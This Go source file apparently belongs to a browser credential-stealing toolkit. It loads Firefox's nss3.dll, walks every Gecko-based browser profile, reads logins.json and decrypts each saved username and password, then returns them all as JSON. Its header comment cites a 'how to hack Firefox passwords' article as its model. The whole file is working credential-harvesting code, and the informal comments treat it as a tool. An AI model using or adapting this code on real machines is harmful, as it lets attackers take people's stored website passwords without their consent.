package passwordsGecko

/*
This project was experimenting with how gecko browsers encrypt and decrypt passwords along with storing them.

I got lot of inspiration from this project https://github.com/unode/firefox_decrypt as well as the information on how to use nss3.dll.

I also used this article to dumb down everything a lot https://medium.com/geekculture/how-to-hack-firefox-passwords-with-python-a394abf18016.

I really like it and it works very well but it's also over 1k lines of code and wanted to make a more simple version for
anyone who wants a simple and easy way to understand.

It should work with any gecko based browser but I have only tested librewolf and firefox so far.
*/

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"kdot/kematian/browsers/structs"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
)

// we got an array of that shit fr
type json_data struct {
	Logins []login_data `json:"logins"`
}

// login data struct cause golang 👍
type login_data struct {
	Hostname            string `json:"hostname"`
	FormSubmitURL       string `json:"formSubmitURL"`
	EncryptedUsername   string `json:"encryptedUsername"`
	EncryptedPassword   string `json:"encryptedPassword"`
	TimeCreated         int    `json:"timeCreated"`
	TimeLastUsed        int    `json:"timeLastUsed"`
	TimePasswordChanged int    `json:"timePasswordChanged"`
	TimesUsed           int    `json:"timesUsed"`
}

// Get NSS and all it's modules that we need
var (
	nss3           = syscall.NewLazyDLL("C:\\Program Files\\Mozilla Firefox\\nss3.dll")
	nssInit        = nss3.NewProc("NSS_Init")
	pk11SDRDecrypt = nss3.NewProc("PK11SDR_Decrypt")
)

// the secItem stuff struct for nss
type secItem struct {
	Type int
	Data *byte
	Len  int
}

type Passwords struct {
	OriginURL string `json:"origin_url"`
	Username  string `json:"username"`
	Password  string `json:"password"`
}

// We gotta initalize nss fr
func initNSS(profile string) error {
	byte_ptr, err := syscall.BytePtrFromString(profile)
	if err != nil {
		return fmt.Errorf("failed to convert profile path to byte pointer: %v", err)
	}
	ret, _, err := nssInit.Call(uintptr(unsafe.Pointer(byte_ptr)))
	if ret != 0 {
		return fmt.Errorf("NSS_Init failed with error: %v", err)
	}
	return nil
}

// gotta decode the base64 strings fr
func decodeBase64(s string) ([]byte, error) {
	//if s[0] == '~' && s[len(s)-1] == '~' {
	//	s = s[1 : len(s)-1]
	//}
	decoded, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return nil, fmt.Errorf("failed to decode base64: %v", err)
	}
	return decoded, nil
}

func decrypt(encrypted string) (string, error) {
	encBytes, err := decodeBase64(encrypted)
	if err != nil {
		return "", err
	}

	// Initalize our secItem with the pointer to the encrypted bytes and the length
	encItem := secItem{Data: &encBytes[0], Len: len(encBytes)}

	var decItem secItem
	// decrypt the bytes!!!!!!!
	ret, _, err := pk11SDRDecrypt.Call(uintptr(unsafe.Pointer(&encItem)), uintptr(unsafe.Pointer(&decItem)), 0)
	if ret != 0 {
		return "", fmt.Errorf("PK11SDR_Decrypt failed with error: %v", err)
	}

	// now we gotta convert that hoe back to a string
	decBytes := (*[1 << 30]byte)(unsafe.Pointer(decItem.Data))[:decItem.Len:decItem.Len]
	return string(decBytes), nil
}

func Get(browsersList []structs.Browser, nss_locations []string) []byte {
	// PATH TO THE GECKO BROWSER PROFILE
	var passwords []Passwords

	for _, nss_location := range nss_locations {
		nss_base_dir := filepath.Dir(nss_location)
		os.Setenv("PATH", os.Getenv("PATH")+";"+nss_base_dir)
	}

	for _, browser := range browsersList {
		if browser.IsChromium {
			continue
		}

		for _, profile := range browser.Profiles {

			_, err := os.Stat(profile.LoginData)
			if err != nil {
				continue
			}

			err = initNSS(profile.NameAndPath)
			if err != nil {
				fmt.Println("Error initializing NSS:", err)
				continue
			}

			loginsJsonData := json_data{}
			loginsJsonFile, err := os.Open(profile.LoginData)
			if err != nil {
				fmt.Println("Error opening logins.json:", err)
				continue
			}
			defer loginsJsonFile.Close()

			jsonParser := json.NewDecoder(loginsJsonFile)
			err = jsonParser.Decode(&loginsJsonData)
			if err != nil {
				fmt.Println("Error decoding logins.json:", err)
				continue
			}

			for _, login := range loginsJsonData.Logins {
				decryptedUsername, err := decrypt(login.EncryptedUsername)
				if err != nil {
					decryptedUsername = login.EncryptedUsername
				}
				decryptedPassword, err := decrypt(login.EncryptedPassword)
				if err != nil {
					decryptedPassword = login.EncryptedPassword
				}
				passwords = append(passwords, Passwords{login.Hostname, decryptedUsername, decryptedPassword})
			}

		}
	}
	jsonData, err := json.MarshalIndent(passwords, "", "    ")
	if err != nil {
		return nil
	}
	return jsonData
}
